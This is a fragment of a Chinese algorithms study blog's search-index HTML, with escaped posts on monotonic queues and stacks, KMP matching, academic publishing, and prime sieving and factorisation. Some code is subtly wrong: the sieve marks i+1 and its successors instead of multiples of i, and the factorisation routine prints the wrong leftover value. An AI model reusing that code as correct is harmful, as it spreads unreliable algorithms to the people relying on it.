            q.erase(q.begin());
        // 如果新进来的值比队列中的最小值还要小，那么将队列中大于当前值的数删除
        while(!q.empty() &amp;amp;&amp;amp; arr[q.back()] &amp;gt;= arr[i]) 
            q.pop_back();
        q.push_back(i);
        if(i &amp;gt;= k - 1) printf(&amp;quot;%d &amp;quot;, arr[q.front()]);
    }
    // 这个过程下来队列中的数始终保持了有序
    
    cout&amp;lt;&amp;lt;endl;
    
    q.clear();
    
    
    // 求最大值是类似的过程
    for(int i = 0; i &amp;lt; n; i ++ )
    {
        if(!q.empty() &amp;amp;&amp;amp; q.front() &amp;lt; i - k + 1) 
            q.erase(q.begin());
        while(!q.empty() &amp;amp;&amp;amp; arr[q.back()] &amp;lt;= arr[i])
            q.pop_back();
        q.push_back(i);
        if(i &amp;gt;= k - 1) printf(&amp;quot;%d &amp;quot;, arr[q.front()]);
    }
    
    return 0;
    
}
&lt;/code&gt;&lt;/pre&gt;
">【数据结构】【队列】单调队列</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/zhan-dan-diao-zhan/"" data-c="
          &lt;p&gt;单调栈就是在栈的基础上保持了数的有序。&lt;/p&gt;
&lt;p&gt;最常见的应用是用来求一个序列/数组中，每个数的左边/右边第一个比其小/大的数的位置。&lt;/p&gt;
&lt;p&gt;例如找一个数组中每一个数的前面最近的比其小的数：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;4, 6, 8, 7, 5&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;首先维护一个栈&lt;code&gt;stk&lt;/code&gt;，从前往后找每个数的答案，在找&lt;code&gt;7&lt;/code&gt;这个数的时候，此时栈中已经保存了&lt;code&gt;4, 6, 8&lt;/code&gt;这三个数了，首先比较栈顶元素&lt;code&gt;8&lt;/code&gt;，大于&lt;code&gt;7&lt;/code&gt;，弹栈，以后&lt;code&gt;8&lt;/code&gt;不会再是&lt;code&gt;7&lt;/code&gt;后面的任意一个数的答案，因为&lt;code&gt;7&amp;lt;8&lt;/code&gt;，而且&lt;code&gt;7&lt;/code&gt;距离它们更近。然后比较下一个数&lt;code&gt;6&amp;lt;7&lt;/code&gt;，即&lt;code&gt;7&lt;/code&gt;的答案是&lt;code&gt;6&lt;/code&gt;，然后将&lt;code&gt;7&lt;/code&gt;入栈供后面的数比较。&lt;/p&gt;
&lt;p&gt;基于此，在找后面数的答案的时候就不需要再与&lt;code&gt;8&lt;/code&gt;进行比较了，如果数据量比较大(例如&lt;code&gt;4, 6, 8, 8, 8, 8, 8, ..., 8, 7, 5, ...&lt;/code&gt;，&lt;code&gt;7&lt;/code&gt;的后面的数不会再与&lt;code&gt;8&lt;/code&gt;进行比较)，将会节省很大一部分时间。&lt;/p&gt;
&lt;p&gt;因此可以发现栈&lt;code&gt;stk&lt;/code&gt;中的每个数是严格按照递增的顺序的，所以称为单调栈。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;// 求右边第一个比其大的数
vector&amp;lt;int&amp;gt; ans(T.size(), 0);
stack&amp;lt;int&amp;gt; s;
for(int i = 0; i &amp;lt; T.size(); i ++ )
{
    while(!s.empty() &amp;amp;&amp;amp; T[s.top()] &amp;lt; T[i])
    {
        ans[s.top()] = i - s.top();
        s.pop();
    }
    s.push(i);
}

// 求右边第一个比其小的数
vector&amp;lt;int&amp;gt; ans(T.size(), 0);
stack&amp;lt;int&amp;gt; s;
for(int i = 0; i &amp;lt; T.size(); i ++ )
{
    while(!s.empty() &amp;amp;&amp;amp; T[s.top()] &amp;gt; T[i])
    {
        ans[s.top()] = i - s.top();
        s.pop();
    }
    s.push(i);
}

// 求左边第一个比其大的数
vector&amp;lt;int&amp;gt; ans(T.size(), 0);
stack&amp;lt;int&amp;gt; s;
for(int i = T.size() - 1; i &amp;gt;= 0; i -- )
{
    while(!s.empty() &amp;amp;&amp;amp; T[s.top()] &amp;lt; T[i])
    {
        ans[s.top()] = i - s.top();
        s.pop();
    }
    s.push(i);
}

// 求左边第一个比其小的数
vector&amp;lt;int&amp;gt; ans(T.size(), 0);
stack&amp;lt;int&amp;gt; s;
for(int i = T.size() - 1; i &amp;gt;= 0; i -- )
{
    while(!s.empty() &amp;amp;&amp;amp; T[s.top()] &amp;gt; T[i])
    {
        ans[s.top()] = i - s.top();
        s.pop();
    }
    s.push(i);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;参考题：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;https://www.acwing.com/video/258/&lt;br&gt;
https://leetcode-cn.com/problems/daily-temperatures/&lt;br&gt;
https://leetcode-cn.com/problems/next-greater-element-i/&lt;br&gt;
https://leetcode-cn.com/problems/maximum-subarray-min-product/&lt;/p&gt;
">【数据结构】【栈】单调栈</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/kmp-suan-fa-dai-ma/"" data-c="
          &lt;p&gt;问题：在一个字串中是否出现过另一个字串。&lt;/p&gt;
&lt;p&gt;KMP算法的核心是找最长公共前后缀，两个字符串比较到第&lt;code&gt;i&lt;/code&gt;个字符串时不相等了，那么模式串指针将会移动到该不相等字符的前面子字符串的最长公共前缀子串的后一个字符。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;例如：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;待匹配字符串：S=&lt;code&gt;abdabababac&lt;/code&gt;&lt;br&gt;
和模式字符串：P=&lt;code&gt;abdabc&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;当两个字符串从头进行比较时，比较到下标为&lt;code&gt;5&lt;/code&gt;的位置时&lt;code&gt;S[i]=&#39;a&#39;&lt;/code&gt;与&lt;code&gt;P[j]=&#39;c&#39;&lt;/code&gt;不相等，此时应该移动模式串指针j到&lt;code&gt;c&lt;/code&gt;的前面子符串&lt;code&gt;abdab&lt;/code&gt;的最长公共前后缀子串(&lt;code&gt;abdab&lt;/code&gt;的最长公共前后缀为&lt;code&gt;ab&lt;/code&gt;)的后一个字符&lt;code&gt;P[3]=&#39;d&#39;&lt;/code&gt;处进行下面的比较。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1635855760559.gif&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;前缀表：表示模式串前i个子串的最长公共前后缀的长度，例如aabaaf，pre[0]=0，pre[1]=1，pre[2]=0，pre[3]=1，pre[4]=2，pre[5]=0。&lt;/p&gt;
&lt;p&gt;next数组可以是前缀表，一般都是前缀表统一减一。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include &amp;lt;iostream&amp;gt;

#define N 100010
#define M 1000010

using namespace std;

int main()
{
    int n, m;
    char P[N], S[M];
    int next[N];
    next[0] = -1;
    
    cin &amp;gt;&amp;gt; n &amp;gt;&amp;gt; P &amp;gt;&amp;gt; m &amp;gt;&amp;gt; S ;
    
    // 计算next数组
    // next[i] 表示 i（包括i）之前最长相等的前后缀长度-1（其实就是j）
    // j指向前缀起始位置，i指向后缀起始位置
    // aabaaf
    // aabaaf
    for (int i = 1, j = -1; i &amp;lt; n; i ++ )
    {
        while (j != -1 &amp;amp;&amp;amp; P[i] != P[j + 1])
            j = next[j]; // 向前回退
        if (P[i] == P[j + 1])
            j++;
        next[i] = j; 
        // next[0]=-1
        // i=1 j=1 next[1]=0
        // i=2 j=-1 next[2]=-1
        // i=3 j=
    }
    
    // 匹配
    for (int i = 0, j = -1; i &amp;lt; m; i ++)
    {
        while (j!=-1 &amp;amp;&amp;amp; S[i] != P[j + 1])
            j = next[j];
        if (S[i] == P[j + 1])
            j++;
        if (j == n-1)
        {
            cout &amp;lt;&amp;lt; i - n + 1 &amp;lt;&amp;lt; &amp;quot; &amp;quot;;
            j = next[j];
        }
    }

    // return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;例题：https://leetcode-cn.com/problems/implement-strstr/&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    int strStr(string haystack, string needle) {
        if(needle == &amp;quot;&amp;quot;) return 0;
        int next[50010];
        next[0] = -1;
        for (int i = 1, j = -1; i &amp;lt; needle.length(); i ++) {
            while (j != -1 &amp;amp;&amp;amp; needle[i] != needle[j + 1]) {
                j = next[j];
            }
            if (needle[i] == needle[j + 1]) {
                j ++;
            }
            next[i] = j;
        }

        for (int i = 0, j = -1; i &amp;lt; haystack.length(); i ++) {
            while (j != -1 &amp;amp;&amp;amp; haystack[i] != needle[j + 1]) {
                j = next[j];
            }
            if (haystack[i] == needle[j + 1]) {
                j ++;
            }
            if (j == needle.length() - 1) {
                return i - needle.length() + 1;
            }
        }
        return -1;
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;参考资料&lt;br&gt;
https://www.bilibili.com/video/BV1PD4y1o7nd&lt;br&gt;
https://www.acwing.com/problem/content/description/833/&lt;br&gt;
https://www.acwing.com/video/259/&lt;/p&gt;
">【算法】KMP算法代码</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/qi-kan-hui-yi-chu-ban-shang-zuo-zhe-zhi-jian-de-guan-xi/"" data-c="
          &lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1640691839497.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;ol&gt;
&lt;li&gt;研究人员向期刊或者会议投稿，交注册费和相应的审稿费等相关费用；&lt;/li&gt;
&lt;li&gt;会议组织者和期刊联系出版社，交出版费用；&lt;/li&gt;
&lt;li&gt;出版社将论文更新到自己的数据库中，然后将数据库卖给全世界各大高校或企业；&lt;/li&gt;
&lt;li&gt;其他开源数据库抓取出版社数据库的论文题目、摘要、参考文献等信息。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;会议组织者：&lt;/strong&gt; 一般由某个学校、组织，为了学术/利益举办会议，负责征集科研工作者的论文并决定是否录用，然后联系出版社进行出版发表，因此要征收科研工作者相应的费用，同时需要向出版社交相应的出版费用。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;期刊：&lt;/strong&gt; 期刊论文是科研工作者针对某学术期刊投稿，审稿专家审稿并返回修改意见，最终由期刊编辑部决定是否录用。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;出版社：&lt;/strong&gt; 一般具有一定声望，像IEEE、Springer、ACM，它们旗下有一些会议、期刊，向会议期刊收取出版费，拿取版权，扩充自己的数据库，向其他企业、高校出售来盈利。其实有的出版社即组织学术会议，也出版学术期刊，比如IEEE。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;出版社数据库：&lt;/strong&gt; 出版社通常维护自己的数据库，比如IEEE的IEEE Xplore就是查询该出版社数据库的入口，这些数据库都是可以下载到原文章的。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;IEEE：https://ieeexplore.ieee.org/&lt;/li&gt;
&lt;li&gt;Springer：https://link.springer.com/&lt;/li&gt;
&lt;li&gt;Elsevier：https://www.elsevier.com/solutions/sciencedirect&lt;/li&gt;
&lt;li&gt;Taylor &amp;amp; Francis：https://www.tandfonline.com/。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;索引数据库：&lt;/strong&gt; 像SCI、EI、CPCI-S等这些数据库其实没有论文的版权，与其说数据库不如说是一个检索工具，类似google/google scholar，可以综合检索到各大出版社的数据库中的文献，但只能在这上面检索到论文的题目，摘要，参考文献等，和它们自己可以会有一个分类，添加一些附加信息，比如影响因子等。比如SCI只收录一些高质量的文章，而EI可能就收录的会多一些。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;SCI科学引文索引(web of science)：http://webofknowledge.com&lt;/li&gt;
&lt;li&gt;EI工程索引：https://www.engineeringvillage.com&lt;/li&gt;
&lt;li&gt;ISTP科技会议录索引：http://webofknowledge.com&lt;/li&gt;
&lt;/ul&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1640691854502.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1640691860761.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
">期刊、会议、出版商、作者之间的关系</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/suan-fa-shu-xue/"" data-c="
          &lt;h2 id=&#34;质数&#34;&gt;质数&lt;/h2&gt;
&lt;h3 id=&#34;线性筛选质数&#34;&gt;线性筛选质数：&lt;/h3&gt;
&lt;p&gt;出现一个数，则把已这个数为因子的数都标记为合数。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如2，所以4,6,8 10....都标记为合数&lt;/li&gt;
&lt;li&gt;如3，所以9,12,15.....都标记为合数&lt;/li&gt;
&lt;li&gt;如4，所以16,20,24...都标记为合数&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;即，若i是素数，则从 j=i*i 开始，把 j+i , j+2i , j+3i .....都标记为合数 （因为2*i, 3*i, 4*i, ...., (i-1)*i 分别是2, 3, 4, ..., i-1的倍数，已经在i之前标记过，所以从j=i*i开始标记）&lt;/p&gt;
&lt;p&gt;筛法的思想是去除要求范围内所有的合数，剩下的就是素数了，而任何合数都可以表示为素数的乘积，因此如果已知一个数为素数，则它的倍数都为合数。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;const int N = 1e5;
int prime[N] = {0};
for(int i = 2; i &amp;lt;= sqrt(N + 1); i++)
{
    if(!prime[i])
    {
        for(int j = i + 1; j &amp;lt;= N; j += i)
            prime[j] = 1;
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;分解质因数&#34;&gt;分解质因数&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;void primeFactor(int n)
{
    int x = sqrt(n) + 1;
    for(int i=2; i&amp;lt;x; i++)
    {
        int cnt = 0; // cnt表示该质因数的幂次
        while(n % i == 0) //输出所有可以约去的数
        {
            cnt ++;
            n /= i;
        }
        if(cnt) cout &amp;lt;&amp;lt; i &amp;lt;&amp;lt; &amp;quot; &amp;quot; &amp;lt;&amp;lt; cnt &amp;lt;&amp;lt; endl;
    }
    if(x &amp;gt; 1) cout &amp;lt;&amp;lt; x &amp;lt;&amp;lt; &amp;quot; &amp;quot; &amp;lt;&amp;lt; 1 &amp;lt;&amp;lt; endl;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;一个自然数的约数个数是它各质因数的次数分别加1相乘的积。&lt;br&gt;
例：18的因数有：1，2，3，6，9，18。而其质因数有18=2×2×3。&lt;br&gt;
&lt;img src=&#34;https://cactusii.github.io//post-images/1601271024765.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
即(1+1) * (2+1)=6个。&lt;/p&gt;
&lt;h3 id=&#34;欧拉函数&#34;&gt;欧拉函数&lt;/h3&gt;
&lt;p&gt;https://www.acwing.com/problem/content/875/&lt;/p&gt;
&lt;p&gt;欧拉函数的定义：1~N中与N互质的数的个数被称为欧拉函数，记为φ(n)&lt;/p&gt;
&lt;p class=&#39;katex-block&#39;&gt;&lt;span class=&#34;katex-display&#34;&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;一&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;个&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;数&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;的&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;质&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;因&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;数&lt;/mi&gt;&lt;mi&gt;N&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;msubsup&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;msub&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msub&gt;&lt;/msubsup&gt;&lt;msubsup&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;msub&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/msub&gt;&lt;/msubsup&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;msubsup&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;/msub&gt;&lt;/msubsup&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;一个数的质因数N = p^{a_{1}}_{1}p^{a_{2}}_{2}...p^{a_{m}}_{m}
&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.68333em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;一&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;个&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;数&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;的&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;质&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;因&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;数&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.10903em;&#34;&gt;N&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.0126em;vertical-align:-0.26630799999999993em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.746292em;&#34;&gt;&lt;span style=&#34;top:-2.433692em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.1449em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.31731428571428577em;&#34;&gt;&lt;span style=&#34;top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.5em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size3 size1 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.143em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.26630799999999993em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.746292em;&#34;&gt;&lt;span style=&#34;top:-2.433692em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.1449em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.31731428571428577em;&#34;&gt;&lt;span style=&#34;top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.5em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size3 size1 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.143em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.26630799999999993em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.7143919999999999em;&#34;&gt;&lt;span style=&#34;top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;m&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.113em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.16454285714285719em;&#34;&gt;&lt;span style=&#34;top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.5em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size3 size1 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;m&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.143em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.247em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;则一个数的欧拉函数的定义：&lt;/p&gt;
&lt;p class=&#39;katex-block&#39;&gt;&lt;span class=&#34;katex-display&#34;&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;ϕ&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;N&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;N&lt;/mi&gt;&lt;mo&gt;∗&lt;/mo&gt;&lt;mfrac&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msub&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/mrow&gt;&lt;msub&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msub&gt;&lt;/mfrac&gt;&lt;mo&gt;∗&lt;/mo&gt;&lt;mfrac&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/msub&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/mrow&gt;&lt;msub&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/msub&gt;&lt;/mfrac&gt;&lt;mo&gt;∗&lt;/mo&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi 